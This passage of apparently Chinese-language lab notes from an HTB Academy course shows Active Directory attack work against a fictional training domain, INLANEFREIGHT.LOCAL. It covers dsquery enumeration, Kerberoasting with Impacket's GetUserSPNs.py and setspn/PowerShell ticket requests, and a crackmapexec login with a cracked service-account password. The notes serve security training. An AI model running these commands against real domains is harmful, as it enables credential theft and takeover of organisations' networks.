<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; dsquery computer</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="通配符搜索"><a href="#通配符搜索" class="headerlink" title="通配符搜索"></a>通配符搜索</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; dsquery * <span class="string">&quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="具有特定属性设置的用户-PASSWD-NOTREQD"><a href="#具有特定属性设置的用户-PASSWD-NOTREQD" class="headerlink" title="具有特定属性设置的用户 (PASSWD_NOTREQD)"></a>具有特定属性设置的用户 (PASSWD_NOTREQD)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; dsquery * <span class="literal">-filter</span> <span class="string">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))&quot;</span> <span class="literal">-attr</span> distinguishedName userAccountControl</span><br><span class="line"></span><br><span class="line">  distinguishedName                                                                              userAccountControl</span><br><span class="line">  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    <span class="number">66082</span></span><br><span class="line">  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      <span class="number">66080</span></span><br><span class="line">  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    <span class="number">66080</span></span><br><span class="line">  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    <span class="number">66080</span></span><br><span class="line">  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           <span class="number">546</span></span><br><span class="line">  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           <span class="number">544</span></span><br><span class="line">  CN=LOGISTICS<span class="variable">$</span>,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               <span class="number">2080</span></span><br><span class="line">  CN=FREIGHTLOGISTIC<span class="variable">$</span>,CN=Users,DC=INLANEFREIGHT,DC=LOCAL      </span><br></pre></td></tr></table></figure>

<h3 id="搜索域控制器"><a href="#搜索域控制器" class="headerlink" title="搜索域控制器"></a>搜索域控制器</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\forend.INLANEFREIGHT&gt; dsquery * <span class="literal">-filter</span> <span class="string">&quot;(userAccountControl:1.2.840.113556.1.4.803:=8192)&quot;</span> <span class="literal">-limit</span> <span class="number">5</span> <span class="literal">-attr</span> sAMAccountName</span><br><span class="line"></span><br><span class="line"> sAMAccountName</span><br><span class="line"> ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span></span><br></pre></td></tr></table></figure>

<h1 id="横向移动和权限提升"><a href="#横向移动和权限提升" class="headerlink" title="横向移动和权限提升"></a>横向移动和权限提升</h1><h2 id="Kerberoasting-with-GetUserSPNs-py"><a href="#Kerberoasting-with-GetUserSPNs-py" class="headerlink" title="Kerberoasting with GetUserSPNs.py"></a>Kerberoasting with GetUserSPNs.py</h2><h3 id="使用-GetUserSPNs-py-列出-SPN-账户"><a href="#使用-GetUserSPNs-py-列出-SPN-账户" class="headerlink" title="使用 GetUserSPNs.py 列出 SPN 账户"></a>使用 GetUserSPNs.py 列出 SPN 账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation </span><br><span class="line">---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               </span><br><span class="line">sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/SQL-CL01-01inlanefreight.<span class="built_in">local</span>:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  &lt;never&gt;               </span><br><span class="line">adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  &lt;never&gt; </span><br></pre></td></tr></table></figure>

<h3 id="请求所有-TGS-票据"><a href="#请求所有-TGS-票据" class="headerlink" title="请求所有 TGS 票据"></a>请求所有 TGS 票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request </span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation </span><br><span class="line">---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               </span><br><span class="line">sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/SQL-CL01-01inlanefreight.<span class="built_in">local</span>:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  &lt;never&gt;               </span><br><span class="line">adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  &lt;never&gt;               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*BACKUPAGENT<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$INLANEFREIGHT</span>.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$</span><br><span class="line">$krb5tgs$23$*SOLARWINDSMONITOR<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$INLANEFREIGHT</span>.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="请求单个-TGS-票据"><a href="#请求单个-TGS-票据" class="headerlink" title="请求单个 TGS 票据"></a>请求单个 TGS 票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation </span><br><span class="line">---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  &lt;never&gt;               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*sqldev<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$INLANEFREIGHT</span>.LOCAL/sqldev*</span><br></pre></td></tr></table></figure>

<h3 id="将-TGS-票据保存到输出文件"><a href="#将-TGS-票据保存到输出文件" class="headerlink" title="将 TGS 票据保存到输出文件"></a>将 TGS 票据保存到输出文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation </span><br><span class="line">---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  &lt;never&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="针对域控制器测试身份验证"><a href="#针对域控制器测试身份验证" class="headerlink" title="针对域控制器测试身份验证"></a>针对域控制器测试身份验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!</span><br></pre></td></tr></table></figure>

<h2 id="Kerberoasting-半手动方法"><a href="#Kerberoasting-半手动方法" class="headerlink" title="Kerberoasting - 半手动方法"></a>Kerberoasting - 半手动方法</h2><h3 id="使用-setspn-exe-枚举-SPN"><a href="#使用-setspn-exe-枚举-SPN" class="headerlink" title="使用 setspn.exe 枚举 SPN"></a>使用 setspn.exe 枚举 SPN</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">htb</span>&gt; <span class="title">setspn.exe</span> -<span class="title">Q</span> */*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Checking</span> <span class="title">domain</span> <span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span>,<span class="title">OU</span>=<span class="title">Domain</span> <span class="title">Controllers</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">exchangeAB</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span></span></span><br><span class="line"><span class="function">        <span class="title">exchangeAB</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">TERMSRV</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span></span></span><br><span class="line"><span class="function">        <span class="title">TERMSRV</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Dfsr</span>-12<span class="title">F9A27C</span>-<span class="title">BF97</span>-4787-9364-<span class="title">D31B6C55EB04</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">ldap</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span>/<span class="title">ForestDnsZones.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">ldap</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span>/<span class="title">DomainDnsZones.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">BACKUPAGENT</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">backupjob</span>/<span class="title">veam001.inlanefreight.local</span></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">SOLARWINDSMONITOR</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">sts</span>/<span class="title">inlanefreight.local</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">sqlprod</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">MSSQLSvc</span>/<span class="title">SPSJDB.inlanefreight.local</span>:1433</span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">sqlqa</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">MSSQLSvc</span>/<span class="title">SQL</span>-<span class="title">CL01</span>-01<span class="title">inlanefreight.local</span>:49351</span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">sqldev</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">MSSQLSvc</span>/<span class="title">DEV</span>-<span class="title">PRE</span>-<span class="title">SQL.inlanefreight.local</span>:1433</span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">adfs</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">adfsconnect</span>/<span class="title">azure01.inlanefreight.local</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Existing</span> <span class="title">SPN</span> <span class="title">found</span>!</span></span><br></pre></td></tr></table></figure>

<h3 id="Targeting-a-Single-User"><a href="#Targeting-a-Single-User" class="headerlink" title="Targeting a Single User"></a>Targeting a Single User</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span></span><br><span class="line"></span><br><span class="line">Id                   : uuid<span class="literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-2</span></span><br><span class="line">SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;</span><br><span class="line">ValidFrom            : <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">36</span>:<span class="number">22</span> PM</span><br><span class="line">ValidTo              : <span class="number">2</span>/<span class="number">25</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">55</span>:<span class="number">25</span> AM</span><br><span class="line">ServicePrincipalName : MSSQLSvc/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span></span><br><span class="line">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey</span><br></pre></td></tr></table></figure>

